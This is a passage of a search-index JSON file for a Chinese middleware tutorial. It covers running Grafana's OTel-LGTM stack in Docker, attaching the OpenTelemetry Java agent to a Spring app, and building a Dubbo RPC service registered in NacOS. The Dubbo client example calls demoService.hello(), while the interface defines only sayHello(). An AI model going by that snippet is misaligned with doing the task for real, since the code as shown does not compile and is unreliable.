observability\uff08\u53ef\u89c2\u5bdf\u6027\uff09\u5de5\u4f5c\u3002\u5b83\u662f OpenTelemetry\uff08OTel\uff09\u7684\u6269\u5c55\u548c\u5b9e\u73b0\uff0c\u76ee\u7684\u662f\u8ba9\u5f00\u53d1\u8005\u80fd\u591f\u4ee5\u66f4\u7b80\u5355\u3001\u96c6\u4e2d\u7684\u65b9\u5f0f\u76d1\u63a7\u548c\u8c03\u8bd5\u4ed6\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 OTelemetry \u8d1f\u8d23\u6536\u96c6\u6570\u636e\uff0cL \u662f\u6307 Loki \u65e5\u5fd7\u6570\u636e\u5e93\uff0cG \u6307 Grafana \u53ef\u89c6\u5316\u5de5\u5177\uff0cT \u6307 Tempo \u94fe\u8def\u6570\u636e\u5e93\uff0cM \u6307 Prometheus Metric \u5ea6\u91cf\u6570\u636e\u5e93\u3002 \u8fd9\u4e9b\u5de5\u5177\u901a\u5e38\u7ec4\u5408\u5728\u4e00\u8d77\u4f7f\u7528\uff0c\u652f\u6301\u5b9e\u65f6\u6536\u96c6\u6570\u636e\u5e76\u76d1\u63a7\u3002 \u8fd9\u4e9b\u91cc\u9762\u5176\u5b9e\u6211\u4eec\u524d\u9762\u7528\u8fc7\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u624b\u52a8\u914d\u3002\u4f8b\u5982 istio \u7f51\u683c\u91cc\u6709 Grafana \u4e0e Prometheus\uff0cNacOS \u4e5f\u4f7f\u7528\u4e86\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch29 OTel-LGTM"},{"location":"29/#_1","text":"\u76f4\u63a5\u4f7f\u7528 docker \u955c\u50cf\u5373\u53ef\uff0c\u6240\u6709\u5de5\u5177\u5747\u5df2\u6253\u5305\u597d\uff0c\u5b98\u65b9\u5728 github \u9875\u9762\u4e5f\u63d0\u4f9b\u4e86 k8s \u7248\u672c\u3002 version: '3' services: grafana-otel-lgtm: image: grafana/otel-lgtm ports: - \"3000:3000\" - \"4317:4317\" - \"4318:4318\" stdin_open: true tty: true \u8981\u542f\u52a8\u7684\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u56e0\u6b64\u542f\u52a8\u65f6\u95f4\u6709\u70b9\u957f\u3002","title":"\u542f\u52a8"},{"location":"29/#_2","text":"\u8fd9\u4e2a\u6808\u76ee\u524d\u5bf9 Java \u652f\u6301\u8f83\u597d\uff0c\u4e0d\u8fc7\u5176\u5b83\u8bed\u8a00\u4e5f\u6709\u652f\u6301\u3002\u8fd9\u91cc\u7528 Spring \u6f14\u793a\u3002 \u8d77\u4e2a\u7b80\u5355\u7684 Spring \u7a0b\u5e8f\uff0c\u7528\u4e0b\u9762\u7684 Controller\u3002 package org.example; import java.util.Optional; import java.util.concurrent.ThreadLocalRandom; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; @RestController public class RollController { private static final Logger logger = LoggerFactory.getLogger(RollController.class); @GetMapping(\"/rolldice\") public String index(@RequestParam(\"player\") Optional<String> player) { int result = this.getRandomNumber(1, 6); if (player.isPresent()) { logger.info(\"{} is rolling the dice: {}\", player.get(), result); } else { logger.info(\"Anonymous player is rolling the dice: {}\", result); } return Integer.toString(result); } public int getRandomNumber(int min, int max) { return ThreadLocalRandom.current().nextInt(min, max + 1); } } \u786e\u4fdd\u80fd\u8fd0\u884c\u540e\uff0c\u6253\u5305\u6210 jar \u5305\u3002 gradle assemble java -jar ./build/libs/app.jar \u4e0b\u8f7d Java Agent\uff0c\u76f8\u5f53\u4e8e\u662f\u4e00\u4e2a\u4ee3\u7406\uff0c curl -L -O https://github.com/open-telemetry/opentelemetry-java-instrumentation/releases/latest/download/opentelemetry-javaagent.jar Java \u81ea\u5e26\u4ee3\u7406\u529f\u80fd\uff0c\u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff0c java -jar -javaagent:opentelemetry-javaagent.jar ./build/libs/app.jar \u73b0\u5728\u6267\u884c\u540e\uff0clogging \u4f1a\u88ab\u53d1\u9001\u5230 Open Telemetry\uff0c\u7136\u540e\u5b58\u5165\u6570\u636e\u5e93\uff0c\u6700\u540e\u53ef\u4ee5\u5728 Grafana \u7684\u754c\u9762\u4e2d\u770b\u5230\u3002 \u4e4b\u540e\u7684\u64cd\u4f5c\u90fd\u662f\u56fe\u5f62\u5316\u7684\uff0c\u53c2\u8003\u6587\u6863\u5373\u53ef\uff0c\u6b64\u5904\u7701\u7565\u3002","title":"\u96c6\u6210"},{"location":"30/","text":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch30 Dubbo RPC Dubbo RPC \u662f\u963f\u91cc\u6700\u5148\u5f00\u53d1\uff0c\u73b0\u5728\u5c5e\u4e8e Apache \u7684 RPC \u6846\u67b6\u3002Dubbo RPC \u9ed8\u8ba4\u4f7f\u7528 gRPC \u534f\u8bae\uff0c\u4f46\u4e5f\u652f\u6301\u5176\u5b83\u901a\u4fe1\u534f\u8bae\u3002\u540c\u65f6 Dubbo RPC \u8fd8\u80fd\u4e0e\u4e4b\u524d\u6211\u4eec\u5728 k8s \u4ecb\u7ecd\u7684 istio \u670d\u52a1\u7f51\u683c\u96c6\u6210\u3002\u5176\u4f7f\u7528\u6bd4\u8d77\u76f4\u63a5\u7684 gRPC \u66f4\u65b9\u4fbf\u3002 \u5982\u679c\u4f60\u559c\u6b22\u7528 Spring Initializr\uff0cDubbo \u4e5f\u63d0\u4f9b\u4e86 \u81ea\u5df1\u7684 initializer \u3002\u4f46\u662f\u4f5c\u8005\u66f4\u504f\u597d\u624b\u52a8\u5f15\u5e93\u3002\u6ce8\u610f\u4e0d\u7528\u5f15 Spring Boot Web\uff0c\u53ea\u5f15 Spring Framework \u7684 Spring Boot \u5373\u53ef\u3002 \u4f9d\u8d56\u914d\u7f6e \u6ce8\u610f\u8981\u9000\u4e00\u4e0b\u7248\u672c\uff0c\u76ee\u524d Dubbo 3.3 \u914d\u7684\u662f SpringBoot 3.1.2\u3002 plugins { id 'java' id 'org.springframework.boot' version '3.1.2' } allprojects { ext { set(\"springBootVersion\", \"3.1.2\") set('dubboVersion', '3.3.0') } repositories { mavenCentral() } apply { plugin 'java' plugin 'org.springframework.boot' } dependencies { implementation platform(\"org.apache.dubbo:dubbo-bom:${dubboVersion}\") implementation \"org.springframework.boot:spring-boot-starter:${springBootVersion}\" implementation 'org.apache.dubbo:dubbo-spring-boot-starter' implementation 'org.apache.dubbo:dubbo-nacos-spring-boot-starter' } java { sourceCompatibility = JavaLanguageVersion.of(21) targetCompatibility = JavaLanguageVersion.of(21) } group = 'com.github.fingerbone' version = '1.0-SNAPSHOT' } \u8fd9\u91cc\u6211\u4eec\u6ce8\u518c\u5230 NacOS \u91cc\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u522b\u7684\u6ce8\u518c\u4e2d\u5fc3\uff0c\u4f46\u662f NacOS \u652f\u6301\u6700\u597d\uff08\u540c\u4e00\u5bb6\u7684\u6bd5\u7adf\uff09\uff0c\u6211\u4eec\u7528 docker \u518d\u8d77\u4e00\u4e2a NacOS\uff0c\u548c\u4e4b\u524d\u4e00\u6837\u3002\u914d\u7f6e\u4e00\u4e0b\u5c31\u597d\u3002 spring: application: name: dubbo-server dubbo: registry: address: nacos://localhost:8848 \u6ce8\u610f\u8fd9\u91cc\u4e00\u5b9a\u8981\u5199\u540d\u5b57\u3002 \u670d\u52a1\u5b9e\u73b0 \u7528 Dubbo \u5199 RPC \u4f1a\u65b9\u4fbf\u5f88\u591a\uff0c\u5199\u4e00\u4e2a\u63a5\u53e3\u7136\u540e\u5b9e\u73b0\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u5199 proto \u6587\u4ef6\u3002 public interface DemoService { String sayHello(String name); } @DubboService public class DemoServiceImpl implements DemoService { @Override public String sayHello(String name) { return \"Hello \" + name; } } \u6ce8\u610f\u542f\u52a8\u7c7b\u8fd8\u8981\u989d\u5916\u52a0 @EnableDubbo \u3002\u542f\u52a8\u540e\uff0cNacOS \u91cc\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u3002 \u5b9e\u9645\u5199\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u628a\u63a5\u53e3\u5355\u72ec\u653e\u4e00\u4e2a\u9879\u76ee\u91cc\uff0c\u4ee5\u7b80\u5316\u4f9d\u8d56\u5173\u7cfb\u3002 \u670d\u52a1\u8c03\u7528 \u518d\u5f00\u4e00\u4e2a\u5b50\u9879\u76ee\uff0c dependencies { implementation \"org.springframework.boot:spring-boot-starter-web:${springBootVersion}\" implementation project(':server') } \u5b50\u9879\u76ee\u8981\u8c03\u7528 Dubbo \u5fae\u670d\u52a1\uff0c\u4e5f\u8981\u5199\u4e0a @EnableDubbo \u3002 \u8981\u8c03\u7528\u53ea\u9700\u8981\uff0c package com.github.fingerbone; import org.apache.dubbo.config.annotation.DubboReference; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class DemoController { @DubboReference private DemoService demoService; @GetMapping public String hello(String name) { return demoService.hello(name); } } \u7136\u540e\u6362\u4e00\u4e0b\u7aef\u53e3\uff0c spring: application: name: dubbo-client server: port: 8088 dubbo: application: qos-port: 33333 registry: address: nacos://localhost:8848 protocol: port: 30880","title":"Dubbo RPC"},{"location":"30/#ch30-dubbo-rpc","text":"Dubbo RPC \u662f\u963f\u91cc\u6700\u5148\u5f00\u53d1\uff0c\u73b0\u5728\u5c5e\u4e8e Apache \u7684 RPC \u6846\u67b6\u3002Dubbo RPC \u9ed8\u8ba4\u4f7f\u7528 gRPC \u534f\u8bae\uff0c\u4f46\u4e5f\u652f\u6301\u5176\u5b83\u901a\u4fe1\u534f\u8bae\u3002\u540c\u65f6 Dubbo RPC \u8fd8\u80fd\u4e0e\u4e4b\u524d\u6211\u4eec\u5728 k8s \u4ecb\u7ecd\u7684 istio \u670d\u52a1\u7f51\u683c\u96c6\u6210\u3002\u5176\u4f7f\u7528\u6bd4\u8d77\u76f4\u63a5\u7684 gRPC \u66f4\u65b9\u4fbf\u3002 \u5982\u679c\u4f60\u559c\u6b22\u7528 Spring Initializr\uff0cDubbo \u4e5f\u63d0\u4f9b\u4e86 \u81ea\u5df1\u7684 initializer \u3002\u4f46\u662f\u4f5c\u8005\u66f4\u504f\u597d\u624b\u52a8\u5f15\u5e93\u3002\u6ce8\u610f\u4e0d\u7528\u5f15 Spring Boot Web\uff0c\u53ea\u5f15 Spring Framework \u7684 Spring Boot \u5373\u53ef\u3002","title":"\u4e2d\u95f4\u4ef6\u901f\u6210 Ch30 Dubbo RPC"},{"location":"30/#_1","text":"\u6ce8\u610f\u8981\u9000\u4e00\u4e0b\u7248\u672c\uff0c\u76ee\u524d Dubbo 3.3 \u914d\u7684\u662f SpringBoot 3.1.2\u3002 plugins { id 'java' id 'org.springframework.boot' version '3.1.2' } allprojects { ext { set(\"springBootVersion\", \"3.1.2\") set('dubboVersion', '3.3.0') } repositories { mavenCentral() } apply { plugin 'java' plugin 'org.springframework.boot' } dependencies { implementation platform(\"org.apache.dubbo:dubbo-bom:${dubboVersion}\") implementation \"org.springframework.boot:spring-boot-starter:${springBootVersion}\" implementation 'org.apache.dubbo:dubbo-spring-boot-starter' implementation 'org.apache.dubbo:dubbo-nacos-spring-boot-starter' } java { sourceCompatibility = JavaLanguageVersion.of(21) targetCompatibility = JavaLanguageVersion.of(21) } group = 'com.github.fingerbone' version = '1.0-SNAPSHOT' } \u8fd9\u91cc\u6211\u4eec\u6ce8\u518c\u5230 NacOS \u91cc\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u522b\u7684\u6ce8\u518c\u4e2d\u5fc3\uff0c\u4f46\u662f NacOS \u652f\u6301\u6700\u597d\uff08\u540c\u4e00\u5bb6\u7684\u6bd5\u7adf\uff09\uff0c\u6211\u4eec\u7528 docker \u518d\u8d77\u4e00\u4e2a NacOS\uff0c\u548c\u4e4b\u524d\u4e00\u6837\u3002\u914d\u7f6e\u4e00\u4e0b\u5c31\u597d\u3002 spring: application: name: dubbo-server dubbo: registry: address: nacos://localhost:8848 \u6ce8\u610f\u8fd9\u91cc\u4e00\u5b9a\u8981\u5199\u540d\u5b57\u3002","title":"\u4f9d\u8d56\u914d\u7f6e"},{"location":"30/#_2","text":"\u7528 Dubbo \u5199 RPC \u4f1a\u65b9\u4fbf\u5f88\u591a\uff0c\u5199\u4e00\u4e2a\u63a5\u53e3\u7136\u540e\u5b9e\u73b0\u5373\u53ef\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u5199 proto \u6587\u4ef6\u3002 public interface DemoService { String sayHello(String name); } @DubboService public class DemoServiceImpl implements DemoService { @Override public String sayHello(String name) { return \"Hello \" + name; } } \u6ce8\u610f\u542f\u52a8\u7c7b\u8fd8\u8981\u989d\u5916\u52a0 @EnableDubbo \u3002\u542f\u52a8\u540e\uff0cNacOS \u91cc\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u3002 \u5b9e\u9645\u5199\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u628a\u63a5\u53e3\u5355\u72ec\u653e\u4e00\u4e2a\u9879\u76ee\u91cc\uff0c\u4ee5\u7b80\u5316\u4f9d\u8d56\u5173\u7cfb\u3002","title":"\u670d\u52a1\u5b9e\u73b0"},{"location":"30/#_3","text":"\u518d\u5f00\u4e00\u4e2a\u5b50\u9879\u76ee\uff0c dependencies { implementation \"org.springframework.boot:spring-boot-starter-web:${springBootVersion}\" implementation project(':server') } \u5b50\u9879\u76ee\u8981\u8c03\u7528 Dubbo \u5fae\u670d\u52a1\uff0c\u4e5f\u8981\u5199\u4e0a @EnableDubbo \u3002 \u8981\u8c03\u7528\u53ea\u9700\u8981\uff0c package com.github.fingerbone; import org.apache.dubbo.config.annotation.DubboReference; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class DemoController { @DubboReference private DemoService demoService; @GetMapping public String hello(String name) { return demoService.hello(name); } } \u7136\u540e\u6362\u4e00\u4e0b\u7aef\u53e3\uff0c spring: application: name: dubbo-client server: port: 8088 dubbo: application: qos-port: 33333 registry: address: nacos://localhost:8848 protocol: port: 30880","title":"\u670d\u52a1\u8c03\u7528"}]}